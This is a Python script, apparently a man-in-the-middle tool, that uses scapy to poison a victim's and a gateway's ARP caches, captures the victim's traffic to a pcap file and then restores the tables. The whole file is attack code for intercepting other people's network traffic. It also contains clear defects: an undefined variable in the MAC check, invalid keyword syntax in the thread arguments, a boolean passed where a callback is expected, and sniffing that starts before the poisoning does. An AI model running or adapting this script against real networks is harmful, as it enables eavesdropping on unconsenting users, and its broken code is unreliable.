import os
import time
import arpPoison

from re import match
from scapy.all import *
from threading import Thread
from argparse import ArgumentParser as AP


# check formatting (IPv4)
def _check_IP(IP_str):
    components = IP_str.split('.')
    for c in components:
        if int(c) > 255 or int(c) < 0:
            return False
    return True


# check formatting (MAC)
def _check_MAC(MAC_str):
    if MAC_str is None:
        return True
    return match("[0-9a-f]{2}((:)[0-9a-f]{2}){5}", new_MAC.lower()) is not None


# check timing
def _check_timeout(start_time, duration):
    return time.time() < start_time + duration


p = AP()
p.add_argument('--interface', type=str, required=True, help='Interface to use for the experiment')
p.add_argument('--victimIP', type=str, required=True, help='Victim IP address')
p.add_argument('--gatewayIP', type=str, required=True, help='Gateway IP address')
p.add_argument('--verbose', action='store_true', help='Toggle to enable full verbosity')
p.add_argument('--duration', type=int, default=100, help='Duration of the attack in seconds')
p.add_argument('--replaceMAC', type=str, default=None, help='MAC to replace in the attack')
p = p.parse_args()

assert _check_IP(p.victimIP), "Victim IP not adhering to IPv4 format xxx.yyy.zzz.www"
assert _check_IP(p.gatewayIP), "Gateway IP not adhering to IPv4 format xxx.yyy.zzz.www"
assert _check_MAC(p.replaceMAC), "Replacement MAC address not adhering to format xx:yy:zz:ww:qq:ss"

if p.verbose:
    print("Poisoning IP address {} with Gateway IP {}".format(p.victimIP, p.gatewayIP))

# There will be two threads: one for poisoning, and one for packet sniffing
# For packet sniffing, wrpcap will be used (courtesy of scapy)
verbosity = 1 if p.verbose else 0
string_of_poison = Thread(target=arpPoison.poisoner, args=(gateway_IP=p.gatewayIP, victim_IP=p.victimIP,
                                                           new_MAC=p.replaceMAC, verbose=verbosity,
                                                           duration=p.duration))

duration = p.duration

start_time = time.time()
packets = sniff(filter="ip host {}".format(p.victimIP), iface=p.interface, stop_filter=_check_timeout(start_time, duration + 1))

if p.verbose:
    print("Attack start")
string_of_poison.start()
string_of_poison.join()

wrpcap("Capture_file_{}_{}.pcap".format(time.time(), p.victimIP), packets)
arpPoison.doctor(gateway_IP=p.gatewayIP, victim_IP=p.victimIP, verbose=verbosity)

if p.verbose:
    print("Process complete")
